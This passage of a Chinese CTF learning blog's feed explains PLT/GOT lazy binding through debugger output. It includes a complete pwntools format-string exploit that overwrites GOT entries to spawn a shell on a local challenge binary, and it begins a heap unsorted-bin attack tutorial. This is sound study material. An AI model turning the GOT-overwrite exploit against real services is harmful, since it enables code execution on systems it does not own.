&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230303132148041.png&#34; alt=&#34;image-20230303132148041&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;plt表&#34;&gt;&lt;a href=&#34;#plt表&#34; class=&#34;headerlink&#34; title=&#34;plt表&#34;&gt;&lt;/a&gt;plt表&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-12-pltgot%E5%8F%8A%E5%BB%B6%E8%BF%9F%E7%BB%91%E5%AE%9A/image-20230303132136453.png&#34; alt=&#34;image-20230303132136453&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_52126646/article/details/119494939&#34;&gt;https://blog.csdn.net/qq_52126646/article/details/119494939&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;延迟绑定&#34;&gt;&lt;a href=&#34;#延迟绑定&#34; class=&#34;headerlink&#34; title=&#34;延迟绑定&#34;&gt;&lt;/a&gt;延迟绑定&lt;/h2&gt;&lt;p&gt;​		以上一篇博客的题目为例&lt;/p&gt;
&lt;p&gt;​		call一个函数的时候,先到plt     0x400650 &amp;lt;system@plt&amp;gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; p system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$2 = &amp;#123;&amp;lt;text variable, no debug info&amp;gt;&amp;#125; 0x400650 &amp;lt;system@plt&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		然后plt里面第一条 jmp     cs:off_600D38 这里会跳到 system@got的地址,(此时还没有初始化)&lt;/p&gt;
&lt;p&gt;​		display &amp;#x2F;3i $rip 设置单步执行后自动显示的内容,这里显示后续三条指令&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; display /3i $rip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2: x/3i $rip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=&amp;gt; 0x400650 &amp;lt;system@plt&amp;gt;:	jmp    QWORD PTR [rip+0x2006e2]        # 0x600d38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x400656 &amp;lt;system@plt+6&amp;gt;:	push   0x2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;   0x40065b &amp;lt;system@plt+11&amp;gt;:	jmp    0x40062&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		之后,0x600d38里面的地址是system@plt刚才jmp的下一条,push 0x2,然后再jmp 0x40062,也就是PLT[0],跳转到动态链接器进行地址解析.找到真正的地址,填入got地址,也就是0x600d38,&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/20wx 0x600d38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x600d38:	0x00400656	0x00000000	0xf7a46e40	0x00007fff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;0x600d48:	0xf7a46f10	0x00007fff	0xf7af2020	0x00007fff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650 ; int system(const char *command)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650                 jmp     cs:off_600D38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650 _system         endp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400656 ; ---------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400656                 push    2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:000000000040065B                 jmp     sub_400620&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		下次在执行的时候,直接就plt-&amp;gt;got的第一个jmp -&amp;gt; 实际地址,也就是说0x600d38里存储的是system的真实内存地址了&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;wx &lt;span class=&#34;number&#34;&gt;0x600d38&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x600d38&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0xf7a31420&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7a46e40&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x600d48&lt;/span&gt;:	&lt;span class=&#34;number&#34;&gt;0xf7a46f10&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xf7af2020&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x00007fff&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pwndbg&amp;gt; x/&lt;span class=&#34;number&#34;&gt;20&lt;/span&gt;wx &lt;span class=&#34;number&#34;&gt;0x00007ffff7a31420&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7a31420&lt;/span&gt; &amp;lt;__libc_system&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x74ff8548&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xfa66e90b&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0f66ffff&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x0000441f&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7a31430&lt;/span&gt; &amp;lt;__libc_system+&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x593d8d48&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x48001649&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xe808ec83&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xfffffa50&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7a31440&lt;/span&gt; &amp;lt;__libc_system+&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0x940fc085&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xc48348c0&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xc0b60f08&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x001f0fc3&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0x7ffff7a31450&lt;/span&gt; &amp;lt;__GI___realpath&amp;gt;:	&lt;span class=&#34;number&#34;&gt;0xe5894855&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x56415741&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0x54415541&lt;/span&gt;	&lt;span class=&#34;number&#34;&gt;0xec814853&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;





</content>
        <category term="PWN入门" />
        <updated>2023-02-28T10:22:14.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/</id>
        <title>pwn入门-11-2月月赛题及反思</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/"/>
        <content type="html">&lt;p&gt;​		2.25号月赛,只有一道pwn题,格式化字符串,其实本身抱着一种相对良好的心态,觉得自己学了一段时间了,前段时间刚看的格式化字符串,应该没什么问题………但还是寄了,其他方向队友都做出来了,就只剩自己这一道pwn题了…感觉比较受打击……&lt;/p&gt;
&lt;p&gt;​		在做题的时候,漏洞点很明显,关于如何利用,自己想了很多很多,越想越复杂,越搞心态越崩.结束后看了下exp,其实比自己想的简单多的多.&lt;/p&gt;
&lt;p&gt;​		总结一下,问题有好几个,一个是调试程序不熟练,浪费很多时间,最重要的一个问题还是&lt;font color=&#34;red&#34;&gt;基础不牢,有些点想不到或者模棱两可,逻辑链连不上,就很容易想复杂&lt;/font&gt;,不确定可不可以,就导致了自己很犹豫要不要尝试一下这种攻击手法&lt;/p&gt;
&lt;p&gt;​		这道题其实就是替换函数地址的事,主要是要搞清楚plt,got的关系以及延迟绑定就可以了.&lt;/p&gt;
&lt;p&gt;​		题目链接:&lt;a href=&#34;https://tangzichengcc.github.io/2023/02/26/pwn%E5%85%A5%E9%97%A8-11-2%E6%9C%88%E6%9C%88%E8%B5%9B%E9%A2%98%E5%8F%8A%E5%8F%8D%E6%80%9D/ezfmt&#34;&gt;https://tangzichengcc.github.io/2023/02/26/pwn入门-11-2月月赛题及反思/ezfmt&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		exp如下&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level=&lt;span class=&#34;string&#34;&gt;&amp;#x27;debug&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.arch=&lt;span class=&#34;string&#34;&gt;&amp;#x27;amd64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal=[&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p=process(&lt;span class=&#34;string&#34;&gt;&amp;#x27;./ezfmt&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendlineafter(&lt;span class=&#34;string&#34;&gt;&amp;#x27;Choice:&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;2&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(p,&amp;#x27;b *0x04008E1&amp;#x27;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload=&amp;#x27;aaaaaaaa&amp;#x27;+&amp;#x27;%6$p&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#system plt -&amp;gt;main&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#atoi -&amp;gt; system got&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_got=&lt;span class=&#34;number&#34;&gt;0x000000000600D38&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;again=&lt;span class=&#34;number&#34;&gt;0x00000000004007B7&lt;/span&gt;  &lt;span class=&#34;comment&#34;&gt;#选择 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;atoi_got=&lt;span class=&#34;number&#34;&gt;0x600D70&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system_plt=&lt;span class=&#34;number&#34;&gt;0x400656&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload=fmtstr_payload(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;,&amp;#123;system_got:again,atoi_got:system_plt&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.sendline(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		1.替换的是.got.plt里的地址 , 替换成的again就是.text段sub_4007B7的地址,这样的话,就可以劫持控制流,再次回来.&lt;/p&gt;
&lt;p&gt;​		意思就是call system的时候先去plt,然后进got.plt里的地址,就直接执行4007b7的指令了,没问题&lt;/p&gt;
&lt;p&gt;​		2.同时把获取选择参数的函数atoi换成system(这里为什么又是plt了呢? 因为system的got表里地址还没有初始化,而且被替换了,那就只能是plt,如果初始化了呢? 调用应该也没问题,都是一样的代码,)&lt;/p&gt;
&lt;p&gt;​		atoi的got地址,换成system的plt地址的话, call atoi –&amp;gt; atoi的plt–&amp;gt;atoi的got –&amp;gt; system的plt –&amp;gt; system的got&lt;font color=&#34;red&#34;&gt;(注意,这里不一样了,这里不是got的第一条指令,如果是的话,就还是跳到我们第一步覆盖的again那里了,覆盖的是下一条,就是push,然后jump到dl_runtime_resolve初始化那里) plt具体内容等下一篇博客写吧,正常来说,400650才是它的开头,但不能跳到这里,不然就到again了下一条就可以了&lt;/font&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650 ; int system(const char *command)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650 _system         proc near               ; CODE XREF: main+DE↓p&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650                 jmp     cs:off_600D38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650 _system         endp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400650&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400656 ; ---------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:0000000000400656                 push    2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.plt:000000000040065B                 jmp     sub_400620&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;​		注意最后要再给它输入一个&amp;#x2F;bin&amp;#x2F;sh, \x00好像无所谓的&lt;/p&gt;
&lt;p&gt;​		context.arch&amp;#x3D;’amd64’ 如果不加的话也会有问题,为啥呢……….?&lt;/p&gt;
&lt;p&gt;​		如何进行 调试呢??? 可以看看xuanxuan那个博客&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-02-26T01:56:50.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/</id>
        <title>pwn入门-10-堆入门之堆溢出及unsorted_bin攻击</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/"/>
        <content type="html">&lt;p&gt;​		堆题其实是目前比较基础的题,栈题都比较少了貌似…自己的进度有点慢,虽然上学期接触到了堆,但也学的一知半解.&lt;/p&gt;
&lt;p&gt;​		最近上了NeSE创始人、带队老师龚老师的课,老师第一节课给的测试题就是一道堆题,看了看他后面的课件,重点也在堆上,所以觉得可以先把栈什么的稍微放一放了,基础其实差不多了,提升的话,可以慢慢来,先赶紧继续学堆.&lt;/p&gt;
&lt;p&gt;​		&lt;/p&gt;
&lt;p&gt;题目链接: 本篇博客地址url + oork_note即可&lt;/p&gt;
&lt;h1 id=&#34;unsorted-bin基础知识&#34;&gt;&lt;a href=&#34;#unsorted-bin基础知识&#34; class=&#34;headerlink&#34; title=&#34;unsorted bin基础知识&#34;&gt;&lt;/a&gt;unsorted bin基础知识&lt;/h1&gt;&lt;p&gt;参考:&lt;a href=&#34;https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/&#34;&gt;https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/unsorted-bin-attack/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;​		Unsorted Bin Attack 被利用的前提是控制 Unsorted Bin Chunk 的 bk 指针。&lt;/p&gt;
&lt;p&gt;​		Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值。&lt;/p&gt;
&lt;h2 id=&#34;基本来源&#34;&gt;&lt;a href=&#34;#基本来源&#34; class=&#34;headerlink&#34; title=&#34;基本来源&#34;&gt;&lt;/a&gt;基本来源&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。&lt;/li&gt;
&lt;li&gt;释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。关于 top chunk 的解释，请参考下面的介绍。&lt;/li&gt;
&lt;li&gt;当进行 malloc_consolidate 时，可能会把合并后的 chunk 放到 unsorted bin 中，如果不是和 top chunk 近邻的话。&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击原理&#34;&gt;&lt;a href=&#34;#攻击原理&#34; class=&#34;headerlink&#34; title=&#34;攻击原理&#34;&gt;&lt;/a&gt;攻击原理&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;     在 [glibc](https://code.woboq.org/userspace/glibc/)/[malloc](https://code.woboq.org/userspace/glibc/malloc/)/[malloc.c](https://code.woboq.org/userspace/glibc/malloc/malloc.c.html) 中的 `_int_malloc` 有这么一段代码，当将一个 unsorted bin 取出的时候，会将 `bck-&amp;gt;fd` 的位置写入本 Unsorted Bin 的位置,就是一个很大的值,比如0xffffffffxxxx
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​	换句话说, bck-&amp;gt;fd 也就是 bk(也就是要修改的地址,所以溢出修改的chunk的bk应该是要修改的地址-0x10),  victim-&amp;gt;bk-&amp;gt;fd &amp;#x3D; victim&lt;/p&gt;
&lt;p&gt;​	av是当前chunk, (av)-&amp;gt;bk &amp;#x3D; bck,就是当前chunk的bk, 晕了晕了,回头看看源码 victim, av什么的&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-10-%E5%A0%86%E5%85%A5%E9%97%A8%E4%B9%8B%E5%A0%86%E6%BA%A2%E5%87%BA%E5%8F%8Aunsorted-bin%E6%94%BB%E5%87%BB/image-20230303140544704.png&#34; alt=&#34;image-20230303140544704&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;/* remove from unsorted list */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (bck-&amp;gt;fd != victim))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;malloc(): corrupted unsorted chunks 